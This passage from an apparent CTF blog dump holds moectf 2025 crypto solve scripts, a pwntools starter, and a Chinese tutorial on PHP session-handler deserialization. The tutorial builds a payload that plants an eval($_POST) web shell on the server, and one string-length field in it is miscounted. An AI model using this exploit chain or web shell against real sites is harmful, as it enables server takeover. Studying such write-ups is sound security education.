ci:                bit = &#x27;0&#x27; if base_idx == 0 else &#x27;1&#x27;                bits.append(bit)                found = True                # 可以打印调试信息                print(f&quot;[&#123;idx&#125;/&#123;total&#125;] match: base_index=&#123;base_idx&#125; (base=&#123;base if base_idx&lt;2 else &#x27;a+&#x27;+str(base-a)&#125;), e=&#123;e&#125;, bit=&#123;bit&#125;&quot;)                break        if found:            break    if not found:        # 如果没找到，说明数据粘贴有遗漏或存在其他随机性，打印并中断        print(f&quot;[-] No match for ciphertext index &#123;idx&#125;&quot;)        raise SystemExit(1)# 3) 把 bits 拼回 bytes 并解码bitstr = &#x27;&#x27;.join(bits)bytes_list = [int(bitstr[i:i+8], 2) for i in range(0, len(bitstr), 8)]plaintext = bytes(bytes_list)print(&quot;Recovered (raw bytes):&quot;, plaintext)try:    print(&quot;Recovered (utf-8):&quot;, plaintext.decode())except:    print(&quot;Recovered (decoded with errors ignored):&quot;, plaintext.decode(errors=&#x27;ignore&#x27;))\n\n\nmoectf&#123;Y0u_h@v3_ju5t_s01v3d_7h1s_pr0b13m!&#125;\n\nhappy rsaimport mathn = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731e = 65537c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141disc = 4 * x - 3sqrt_val = math.isqrt(disc)if sqrt_val ** 2 == disc:    s = (sqrt_val - 1) // 2    phi = n - s    d = pow(e, -1, phi)    m = pow(c, d, n)    flag = m.to_bytes((m.bit_length() + 7) // 8, &#x27;big&#x27;)    print(flag.decode())else:    print(&quot;Not a perfect square&quot;) &quot;&quot;&quot;&quot;&quot;&quot;\n\nLedengre_revengefrom Cryptodome.Cipher import AESfrom Cryptodome.Util.number import bytes_to_long, long_to_bytesimport copydef function(x, p):    if x &gt;= p:        y = x    elif pow(x, (p-1)//2, p) == 1:        y = pow(x, 2, p)    else:        y = pow(x, 3, p)    return yp_ = 71583805456773770888820224577418671344500223401233301642692926000191389937709key = 60679aes_key = long_to_bytes(key &lt;&lt; 107)cipher = AES.new(aes_key, AES.MODE_ECB)a = [[239, 239, 251, 239], [233, 227, 233, 251], [251, 239, 251, 233], [233, 227, 251, 233]]primes = set(sum(a, [])) | &#123;251&#125;dict_pr_inv = &#123;&#125;for pr in primes:    inv = [[] for _ in range(256)]    for x in range(256):        y = function(x, pr)        inv[y].append(x)    dict_pr_inv[pr] = invdef reverse_half(current, lis_input, a, dict_pr_inv, cipher):    lis = copy.deepcopy(lis_input)    for round_num in range(10):        bit_matrix = [[ (lis[row][col] &amp; 1) for col in range(4)] for row in range(4)]        for row in range(4):            for col in range(4):                lis[row][col] //= 2        new_S = [[0 for _ in range(4)] for _ in range(4)]        for row in range(4):            for col in range(4):                new_S[row][col] = current[row + 4 * col]        temp_S = [[0 for _ in range(4)] for _ in range(4)]        for row in range(4):            for col in range(4):                p2 = a[col][row]                target = new_S[row][col]                possibles = dict_pr_inv[p2][target]                filtered = []                for x in possibles:                    greater = 1 if x &gt; (p2 // 2) else 0                    if greater == bit_matrix[col][row]:                        filtered.append(x)                if len(filtered) != 1:                    print(f&quot;Multiple or no possibilities at row &#123;row&#125;, col &#123;col&#125;, round &#123;round_num&#125;: &#123;filtered&#125;, target=&#123;target&#125;, p2=&#123;p2&#125;&quot;)                    return None                temp_S[row][col] = filtered[0]        enc_S = [[0 for _ in range(4)] for _ in range(4)]        for row in range(4):            for col in range(4):                target = temp_S[row][col]                possibles = dict_pr_inv[251][target]                if not possibles:                    print(f&quot;No possibilities for target &#123;target&#125; with p=251 at row &#123;row&#125;, col &#123;col&#125;, round &#123;round_num&#125;&quot;)                    return None                enc_S[row][col] = possibles[0]        enc = bytes([enc_S[row][col] for col in range(4) for row in range(4)])        current = cipher.decrypt(enc)    return currentlis0 = [[341, 710, 523, 1016], [636, 366, 441, 790], [637, 347, 728, 426], [150, 184, 421, 733]]lis1 = [[133, 301, 251, 543], [444, 996, 507, 1005], [18, 902, 379, 878], [235, 448, 836, 263]]ms = [30565192635368786249732024567787542864212990230048954769681860484383995323228, 41018612821404984639088200009631128480287233171184346873011065515807394614481]for m in ms:    final_concat = long_to_bytes(m)    if len(final_concat) != 32:        final_concat = b&#x27;\\x00&#x27; * (32 - len(final_concat)) + final_concat    text0 = final_concat[:16]    text1 = final_concat[16:]    flag0 = reverse_half(text0, lis0, a, dict_pr_inv, cipher)    if flag0 is None:        print(f&quot;Failed to decrypt text0 for m=&#123;m&#125;&quot;)        continue    flag1 = reverse_half(text1, lis1, a, dict_pr_inv, cipher)    if flag1 is None:        print(f&quot;Failed to decrypt text1 for m=&#123;m&#125;&quot;)        continue    flag = flag0 + flag1    computed_key = 0    for col in range(4):        for row in range(4):            idx = row + col * 4            v = bytes_to_long(flag[idx*2 : idx*2 + 2])            w = pow(v, -2, p_) + 1            leg = pow(w, (p_-1)//2, p_)            bit = ((leg + 1) % p_ // 2)            computed_key = computed_key * 2 + bit    if computed_key == key:        print(&quot;Flag:&quot;, flag)        break    else:        print(f&quot;Computed key &#123;computed_key&#125; does not match expected key &#123;key&#125; for m=&#123;m&#125;&quot;) &quot;&quot;&quot;        Flag: b&#x27;moectf&#123;E@5Y_1eGendre_@nd_@ES*10&#125;&#x27;&quot;&quot;&quot;\n\neasy_gcdfrom Cryptodome.Util.number import long_to_bytesfrom math import gcddef trim_poly(p):    while len(p) &gt; 0 and p[-1] == 0:        p.pop()def poly_mul(a, b, n):    res = [0] * (len(a) + len(b) - 1)    for i in range(len(a)):        for j in range(len(b)):            res[i + j] = (res[i + j] + a[i] * b[j]) % n    trim_poly(res)    return resdef poly_div(dividend, divisor, n):    dividend = dividend[:]    divisor = divisor[:]    trim_poly(dividend)    trim_poly(divisor)    if len(divisor) == 0:        raise ValueError(&quot;Division by zero polynomial&quot;)    if len(dividend) &lt; len(divisor):        return [0], dividend    q = [0] * (len(dividend) - len(divisor) + 1)    for i in range(len(dividend) - len(divisor), -1, -1):        base = divisor[-1]        try:            inv = pow(base, -1, n)            coeff = (dividend[i + len(divisor) - 1] * inv) % n        except ValueError:            print(&quot;Inverse failed, attempting to factor n...&quot;)            g = gcd(base, n)            if 1 &lt; g &lt; n:                p = g                q = n // p                phi_calc = (p - 1) * (q - 1)                if pow(phi_calc, e, n) == enc_phi:                    print(&quot;Phi verified&quot;)                    d_calc = pow(e, -1, phi_calc)                    if pow(d_calc, e, n) == enc_d:                        print(&quot;D verified&quot;)                        flag_int = pow(enc_flag, d_calc, n)                        flag = long_to_bytes(flag_int)                        print(&quot;Flag:&quot;, flag)                    else:                        print(&quot;D not verified&quot;)                else:                    print(&quot;Phi not verified&quot;)            else:                print(&quot;Invalid factor, base=&quot;, base)            import sys            sys.exit(0)        q[i] = coeff        for j in range(len(divisor)):            dividend[i + j] = (dividend[i + j] - coeff * divisor[j]) % n    trim_poly(dividend)    return q, dividenddef poly_gcd(f, g, n):    f = f[:]    g = g[:]    trim_poly(f)    trim_poly(g)    while len(g) &gt; 0:        q, r = poly_div(f, g, n)        f = g        g = r        trim_poly(g)    return fe = 11n = 31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243enc_d = 13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212enc_phi = 7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145enc_flag = 894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686f = [0] * (e + 1)f[0] = (-enc_d) % nf[e] = 1trim_poly(f)for k in range(1, 11):    poly = [1]    for _ in range(e):        poly = poly_mul(poly, [(-1) % n, e % n], n)    ke = pow(k, e, n)    enc_phi_k = (ke * enc_phi) % n    poly[0] = (poly[0] - enc_phi_k) % n    trim_poly(poly)    gcd_poly = poly_gcd(f, poly, n)    trim_poly(gcd_poly)    if len(gcd_poly) == 2:        lead = gcd_poly[1]        try:            inv_lead = pow(lead, -1, n)        except ValueError:            g = gcd(lead, n)            if 1 &lt; g &lt; n:                p = g                q = n // p                phi_calc = (p - 1) * (q - 1)                if pow(phi_calc, e, n) == enc_phi:                    d_calc = pow(e, -1, phi_calc)                    if pow(d_calc, e, n) == enc_d:                        flag_int = pow(enc_flag, d_calc, n)                        flag = long_to_bytes(flag_int)                        print(&quot;Flag:&quot;, flag)                    else:                        print(&quot;D not verified&quot;)                else:                    print(&quot;Phi not verified&quot;)            else:                print(&quot;Invalid factor for lead&quot;)            continue        const = (gcd_poly[0] * inv_lead) % n        d = (-const) % n        if pow(d, e, n) == enc_d:            flag_int = pow(enc_flag, d, n)            flag = long_to_bytes(flag_int)            print(&quot;Flag:&quot;, flag)            break\n\n杂交随机数l = 116m = 1 &lt;&lt; la = -233a_mod = a % minv_a = pow(a_mod, -1, m)N = 4567941593066862873653209393990031966807270114415459425382356207107640curr_L_int = N &gt;&gt; lcurr_R_int = N &amp; (m - 1)stack = [(curr_L_int, curr_R_int, 0)]while stack:    L_int, R_int, steps = stack.pop()    if steps == 2025:        original_int = (L_int &lt;&lt; l) | R_int        flag_bytes = original_int.to_bytes(29, &#x27;big&#x27;)        try:            flag = flag_bytes.decode(&#x27;utf-8&#x27;)            if flag.startswith(&#x27;moectf&#123;&#x27;) and flag.endswith(&#x27;&#125;&#x27;):                print(flag)        except UnicodeDecodeError:            pass        continue    S = R_int &gt;&gt; 1    last_bit = R_int &amp; 1    p_S = S.bit_count() % 2    for b in [0, 1]:        prev_L_int = (b &lt;&lt; (l - 1)) + S        diff = (L_int - prev_L_int) % m        prev_R_int = (inv_a * diff) % m        p_R = prev_R_int.bit_count() % 2        if (b ^ p_S ^ p_R) == last_bit:            stack.append((prev_L_int, prev_R_int, steps + 1))    &quot;&quot;&quot;    moectf&#123;I5_1t_Stream0rBlock.?&#125;    &quot;&quot;&quot;\n\n\npwn二进制漏洞审计入门指北from pwn import *from pwn import *                                    # 导入 pwntools。context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;) # 一些基本的配置。 # 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。 # io = process(&#x27;./pwn&#x27;)             # 在本地运行程序。# gdb.attach(io)                    # 启动 GDBio = connect(&#x27;127.0.0.1&#x27;, 52202)              # 与在线环境交互。io.sendline(b&#x27;114511&#x27;)              # 什么时候用 send 什么时候用 sendline？ payload  = p32(0xdeadbeef)          # p32(0xdeadbeef)、b&quot;\\xde\\xad\\xbe\\xef&quot;、b&quot;deadbeef&quot; 有什么区别？                                    # 你看懂原程序这里的检查逻辑了吗？payload += b&#x27;shuijiangui&#x27;           # strcmp io.sendafter(b&#x27;password.&#x27;, payload) # 发送！通过所有的检查。 io.interactive()                    # 手动接收 flag。\n\n\nmoectf&#123;THe-b3GlnniNG_0F_forMat85451c15&#125;\n\n","categories":["moectf"],"tags":["moectf 2025"]},{"title":"session反序列化","url":"/2025/09/27/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"什么是session在讲php session反序列化之前,必须知道什么是session\nSession一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里仅讨论PHP session机制。\nPHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。\nPHP Session 的工作流程session的工作流程很简单,当开始一个会话时,php会尝试从请求中查找会话ID(通常通过会话cookie),如果发现请求的cookie,get,post中不存在session id,php就会自动调用php_session_create_id函数创建一个新的会话,并且在http response报文中通过set-cookie头部发送给客户端保存,如图:\n\n有时候浏览器的用户设置中会禁止cookie,当浏览器客户端中的cookie被禁用的情况下,php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项。\n会话开始之后，PHP 就会将会话中的数据设置到 $_SESSION 变量中，如下述代码就是一个在 $_SESSION 变量中注册变量的例子：\n&lt;?phpsession_start();if (!isset($_SESSION[&#x27;username&#x27;])) &#123;  \t$_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;&#125;?&gt;\n\n当php停止的时候,php会使用其内置的文件会话保存管理器来完成对session的保存,也可以通过配置项session.save_handler\n来修改所要采用的文件会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项session.save_path所指定的位置。\n整个流程大概如上所述，也可参考下述流程图：\n\nPHP session 在 php.ini 中的配置PHP session在php.ini中主要存在以下配置项：\n\nsession.gc_divisor\nphp session垃圾回收机制相关配置\n\nsession.sid_bits_per_character\n指定编码的会话ID字符中的位数\n\nsession.save_path&#x3D;””\n该配置主要设置session的存储路径\n\nsession.save_handler&#x3D;””\n该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数\n\nsession.use_strict_mode\n严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID\n\nsession.use_cookies\n指定是否在客户端用 cookie 来存放会话 ID，默认启用\n\nsession.cookie_secure\n指定是否仅通过安全连接发送 cookie，默认关闭\n\nsession.use_only_cookies\n指定是否在客户端仅仅使用cookie来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击\n\nsession.name\n指定会话名以用做 cookie 的名字，只能由字母数字组成，默认为 PHPSESSID\n\nsession.auto_start\n指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动\n\nsession.cookie_lifetime\n指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 0 表示“直到关闭浏览器”。默认为 0\n\nsession.cookie_path\n指定要设置会话cookie 的路径，默认为 &#x2F;\n\nsession.cookie_domain\n指定要设置会话cookie 的域名，默认为无，表示根据 cookie 规范产生cookie的主机名\n\nsession.cookie_httponly\n将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用\n\nsession.serialize_handler\n定义用来序列化&#x2F;反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述\n\nsession.gc_probability\n该配置项与 session.gc_divisor 合起来用来管理 garbage collection，即垃圾回收进程启动的概率\n\nsession.gc_divisor\n该配置项与session.gc_probability合起来定义了在每个会话初始化时启动垃圾回收进程的概率\n\nsession.gc_maxlifetime\n指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在session启动的时候开始（ 取决于session.gc_probability 和 session.gc_divisor）\n\nsession.referer_check\n包含有用来检查每个 HTTP Referer的子串。如果客户端发送了Referer信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串\n\nsession.cache_limiter\n指定会话页面所使用的缓冲控制方法（none/nocache/private/private_no_expire/public）。默认为 nocache\n\nsession.cache_expire\n以分钟数指定缓冲的会话页面的存活期，此设定对nocache缓冲控制方法无效。默认为 180\n\nsession.use_trans_sid\n指定是否启用透明 SID 支持。默认禁用\n\nsession.sid_length\n配置会话ID字符串的长度。 会话ID的长度可以在22到256之间。默认值为32。\n\nsession.trans_sid_tags\n指定启用透明sid支持时重写哪些HTML标签以包括会话ID\n\nsession.trans_sid_hosts\n指定启用透明sid支持时重写的主机，以包括会话ID\n\nsession.sid_bits_per_character\n配置编码的会话ID字符中的位数\n\nsession.upload_progress.enabled\n启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。\n\nsession.upload_progress.cleanup\n读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用\n\nsession.upload_progress.prefix\n配置$ _SESSION中用于上传进度键的前缀，默认为upload_progress_\n\nsession.upload_progress.name\n$ _SESSION中用于存储进度信息的键的名称，默认为PHP_SESSION_UPLOAD_PROGRESS\n\nsession.upload_progress.freq\n定义应该多长时间更新一次上传进度信息\n\nsession.upload_progress.min_freq\n更新之间的最小延迟\n\nsession.lazy_write\n配置会话数据在更改时是否被重写，默认启用\n\n\nPHP session 的存储机制前面有提到过,在php中,不同的序列化&#x2F;反序列化的处理器,会导致不同的session储存方式。因为PHP session的存储机制是由session.serialize_handler来定义引擎的。默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名。\n\n文件的内容一直都是session值经过序列化之后的内容，只是格式略有变化\n![20191026142445-4dd97c2e-f7b9-1 (&#x2F;images&#x2F;20191026142445-4dd97c2e-f7b9-1 (1).png)](&#x2F;images&#x2F;20191026142445-4dd97c2e-f7b9-1 (1).png)\nsession.serialize_handler定义的引擎有三种，如下表所示：\n\n\n\n处理器名称\n存储格式\n\n\n\nphp\n键名 + 竖线 + 经过serialize()函数序列化处理的值\n\n\nphp_binary\n键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值\n\n\nphp_serialize\n经过serialize()函数序列化处理的数组\n\n\n上述三种处理器中，php_serialize在内部简单地直接使用 serialize/unserialize函数，并且不会有php和 php_binary所具有的限制。 使用较旧的序列化处理器导致$_SESSION 的索引既不能是数字也不能包含特殊字符(| 和 !) 。\n下面我们实例来看看三种不同处理器序列化后的结果。\nphp处理器首先来看看session.serialize_handler等于 php时候的序列化结果，php代码如下\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\n\nsession|s:6:&quot;winter&quot;;\n\nsession 为$_SESSION[&#39;session&#39;]的键名，|后为传入 GET 参数经过序列化后的值,s代表是字符串类型\nphp_binary处理器再来看看session.serialize_handler等于 php_binary时候的序列化结果。\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\nsessions:6:&quot;winter&quot;;\n\n但实际上,它应该长成这样:\n[0x07]sessions:6:&quot;winter&quot;;\n\n这样不好看出区别,改一下代码\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;sessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\n#sessionsessionsessionsessionsessions:6:&quot;winter&quot;;\n\n这里设置了键值长度为 35，35 对应的 ASCII 码为#，所以最终的结果就是这样\nphp_serialize 处理器来看php_serialize对session的处理结果\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\na:1:&#123;s:7:&quot;session&quot;;s:6:&quot;winter&quot;;&#125;\n\na:1表示$_SESSION数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值\n漏洞原理一个payload如下;\n&lt;form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”&gt;    &lt;input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” /&gt;    &lt;input type =“ file” name =“ file” /&gt;    &lt;input type =“ submit” /&gt;&lt;/form&gt;\n\n然后$_SESSION中的键值就会为$_SESSION[&quot;upload_progress_ryat&quot;]，在会话上传过程中，将对会话数据进行序列化&#x2F;反序列化，序列化格式由php.ini中的session.serialize_handler选项设置。 这意味着，如果在脚本中设置了不同的serialize_handler，那么可以导致注入任意session数据。\n上面的解释可能看起来有些绕，简单来说php处理器和php_serialize处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。\n形成的原理就是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。\n定义一个session.php文件，用于传入 session值，文件内容如下：\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n我们传入hello,得到的session内容如下:\na:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;\n\n新建一个class.php文件\n&lt;?php   error_reporting(0);  ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);  session_start();    class XianZhi&#123;    public $name = &#x27;panda&#x27;;    function __wakeup()&#123;      echo &quot;Who are you?&quot;;    &#125;    function __destruct()&#123;      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;    &#125;  &#125;  $str = new XianZhi(); ?&gt;\n\n\n实例化对象后，输出了panda\n这两个文件的作用很清晰，session.php文件的处理器是php_serialize，class.php文件的处理器是php，session.php文件的作用是传入可控的 session值，class.php文件的作用是在反序列化开始前输出Who are you?，反序列化结束的时候输出name值。\n这两个文件如果想要利用php bug #71101，我们要在session.php文件传入|+序列化格式的值，然后再次访问class.php文件的时候，就会在调用session值的时候，触发此 BUG。\n首先生成序列化字符串，利用 payload 如下\n&lt;?phpclass XianZhi&#123;    public $name;    function __wakeup()&#123;      echo &quot;Who are you?&quot;;    &#125;    function __destruct()&#123;      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;    &#125;&#125;    $str = new XianZhi();    $str-&gt;name = &quot;xianzhi&quot;;    echo serialize($str);  ?&gt;\n\npayload:\nO:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;\n\n然后传入session.php,查看现在的session值\na:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;\n\n再次访问class.php文件的时候，就会发现已经触发了php bug #71101，如下图所示：\n遇到竖线 |，认为前面是键名，后面是值\n\n例题2019 年巅峰极客大赛lol\n只分析session反序列化部分\n├── app│   ├── controller│   │   ├── Files.class.php│   │   └── IndexController.class.php│   ├── model│   │   └── Download.class.php│   └── view│       └── Cache.class.php├── core│   ├── config.php│   ├── core.php│   └── func.php├── index.php├── upload│   └── e9ovitochivkoamlodj6vu9g7g└── user\n\n在config.php文件中找到提示:\n&lt;?php$config=array(    &#x27;debug&#x27;=&gt;&#x27;false&#x27;,    &#x27;ini&#x27;=&gt;array(        &#x27;session.name&#x27; =&gt; &#x27;PHPSESSID&#x27;,        &#x27;session.serialize_handler&#x27; =&gt; &#x27;php&#x27;    ));\n\n可以看到php引擎是php,在&#x2F;core&#x2F;core.php中\n&lt;?phpif(!defined(&#x27;Core_DIR&#x27;))&#123;    exit();&#125;include(Core_DIR.DS.&#x27;config.php&#x27;);include(Core_DIR.DS.&#x27;func.php&#x27;);_if_debug($config[&#x27;debug&#x27;]);spl_autoload_register(&#x27;autoload_class&#x27;);config($config[&#x27;ini&#x27;]);session_start();define(&#x27;Upload_DIR&#x27;,Image_DIR.DS.session_id());init();$app = new IndexController();if(method_exists($app, $app-&gt;data[&#x27;method&#x27;]))&#123;    $app-&gt;&#123;$app-&gt;data[&#x27;method&#x27;]&#125;($app-&gt;data[&#x27;param&#x27;]);&#125;else&#123;    $app-&gt;index();&#125;#$this-&gt;method($_POST)\n\n肯定是有地方读取了session,接下来寻找可控的session点.在app/model/Cache.class.php文件中找到\n&lt;?phpclass Cache&#123;    public $data;    public $sj;    public $path;    public $html;    function __construct($data)&#123;        $this-&gt;data[&#x27;name&#x27;]=isset($data[&#x27;post&#x27;][&#x27;name&#x27;])?$data[&#x27;post&#x27;][&#x27;name&#x27;]:&#x27;&#x27;;        $this-&gt;data[&#x27;message&#x27;]=isset($data[&#x27;post&#x27;][&#x27;message&#x27;])?$data[&#x27;post&#x27;][&#x27;message&#x27;]:&#x27;&#x27;;        $this-&gt;data[&#x27;image&#x27;]=!empty($data[&#x27;image&#x27;])?$data[&#x27;image&#x27;]:&#x27;/static/images/pic04.jpg&#x27;;        $this-&gt;path=Cache_DIR.DS.session_id().&#x27;.php&#x27;;    &#125;    function __destruct()&#123;        $this-&gt;html=sprintf(&#x27;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; /&gt;&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/noscript.css&quot; /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class=&quot;is-preload&quot;&gt;&lt;div id=&quot;wrapper&quot;&gt;&lt;header id=&quot;header&quot;&gt; &lt;div class=&quot;logo&quot;&gt;&lt;span class=&quot;icon fa-diamond&quot;&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class=&quot;content&quot;&gt;&lt;div class=&quot;inner&quot;&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href=&quot;#you&quot;&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id=&quot;main&quot;&gt;&lt;article id=&quot;you&quot;&gt;    &lt;h2 class=&quot;major&quot; ng-app&gt;%s&lt;/h2&gt;    &lt;span class=&quot;image main&quot;&gt;&lt;img src=&quot;%s&quot; alt=&quot;&quot; /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=location.href=&quot;/download/%s&quot;&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id=&quot;footer&quot;&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/browser.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/breakpoints.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/util.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/angular.js&quot;&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;&#x27;,substr($this-&gt;data[&#x27;name&#x27;],0,62),$this-&gt;data[&#x27;image&#x27;],$this-&gt;data[&#x27;message&#x27;],session_id().&#x27;.jpg&#x27;);        if(file_put_contents($this-&gt;path,$this-&gt;html))&#123;            include($this-&gt;path);        &#125;    &#125;&#125;\n\n这里的name和message是可控的,然后将得到的内容传入到path中并且包含,payload:\n&lt;?phpclass Cache&#123;    public $data ;    public $sj;    public $path = &#x27;/var/www/html/1.php&#x27;;    public $html;&#125;    $str = new Cache();    $str-&gt;data= [    &quot;name&quot; =&gt; &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;,    &quot;message&quot; =&gt; &quot;panda&quot;,    &quot;image&quot; =&gt; &quot;panda&quot;];    echo serialize($str);?&gt;\n\n得到字符串:\nO:5:&quot;Cache&quot;:4:&#123;s:4:&quot;data&quot;;a:3:&#123;s:4:&quot;name&quot;;s:16:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;;s:7:&quot;message&quot;;s:5:&quot;panda&quot;;s:5:&quot;image&quot;;s:5:&quot;panda&quot;;&#125;s:2:&quot;sj&quot;;N;s:4:&quot;path&quot;;s:19:&quot;/var/www/html/1.php&quot;;s:4:&quot;html&quot;;N;&#125;\n\n然后在前面O出加上|欺骗session反序列化引擎,当用默认php引擎读取是,|会将其后的 O:5:&quot;Cache&quot;...当作值反序列化。\n再建立up.html文件\n&lt;form action=&quot;http://10.37.14.49/1.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; 